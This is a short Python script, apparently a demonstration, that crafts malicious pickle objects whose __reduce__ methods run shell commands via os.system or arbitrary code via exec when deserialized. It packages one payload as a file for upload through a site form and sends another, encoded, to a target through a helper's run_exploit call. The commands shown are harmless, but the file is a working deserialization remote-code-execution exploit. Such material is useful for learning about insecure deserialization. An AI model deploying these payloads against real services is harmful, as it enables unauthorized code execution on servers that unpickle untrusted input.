from pickle_exploit import PickleExploit
import os


class RCE(object):
    def __reduce__(self):
        raise NotImplementedError


class PayloadFile(RCE):
    def __reduce__(self):
        cmd = "echo Hello World! I'm inside > payload.txt & payload.txt"
        import os
        return os.system, (cmd,)


class PayloadSite(RCE):
    def __reduce__(self):
        return (exec, ("import webbrowser; webbrowser.open('http://milliondollarhomepage.com')", ))


if __name__ == '__main__':
    # load file payload on site form
    PickleExploit.get_pickled_file(PayloadFile())

    # send payload dump by request
    bytes_payload = PickleExploit.dump_with_encode(PayloadSite())
    PickleExploit.run_exploit(payload=bytes_payload)

